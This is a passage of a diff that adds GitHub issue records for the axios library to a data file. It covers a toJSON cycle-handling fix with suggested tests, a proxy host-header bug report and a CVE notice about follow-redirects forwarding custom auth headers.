+        });
+        visited.delete(source);
+        return target;
+      }
+    }
+    return source;
+  };
+
+  return visit(obj);
+};
+```
+
+### Test coverage to add
+
+`tests/unit/utils.test.js` `describe('toJSON', ...)` currently only exercises self-cycles. Add at minimum:
+
+- Shared sibling object referenced twice — both occurrences should serialize.
+- Shared sibling array referenced twice — same.
+- Mixed case: shared sibling that itself contains a self-cycle — outer occurrences serialize, inner cycle is broken.
+
+### Related
+
+- #7230 — closed/will-be-closed; this issue tracks the maintainer-led version.
+"
+issue_body,10805,jasonsaayman,User,2026-04-27T13:40:42Z,closed,"If user set a customized header `host` field, the `host` should not be changed while sending request.","If user set a customized header `host` field, the `host` should not be changed while sending request. 
+
+However, when using `proxy` config and default adapter `http` in nodejs, the `host` header will be reset to request `url` no matter config `headers.host` field is set or not.
+
+example:
+```
+axios.get(""http://127.0.0.1:4000"", {
+  headers: {
+    host: ""example.com"",
+  },
+  proxy: {
+    protocol: ""http"",
+    host: ""127.0.0.1"",
+    port: 8888,
+  },
+});
+```
+
+proxy request should keep header `host` field as `example.com` instead of `127.0.0.1:4000`
+
+before:
+```
+GET / HTTP/1.1
+host 127.0.0.1:4000
+```
+
+fix:
+```
+GET / HTTP/1.1
+host example.com
+```"
+issue_body,10801,WilliamHolmes,User,2026-04-24T14:30:14Z,closed,CVE-2026-40895 follow-redirects subdependecy is vulnerable,"CVE-2026-40895 MEDIUM 5.3
+
+axios-1.15.2.tgz > follow-redirects-1.15.11.tgz
+
+follow-redirects is an open source, drop-in replacement for Node's `http` and `https` modules that automatically follows redirects. Prior to 1.16.0, when an HTTP request follows a cross-domain redirect (301/302/307/308), follow-redirects only strips authorization, proxy-authorization, and cookie headers (matched by regex at index.js). Any custom authentication header (e.g., X-API-Key, X-Auth-Token, Api-Key, Token) is forwarded verbatim to the redirect target. This vulnerability is fixed in 1.16.0.
+
+"
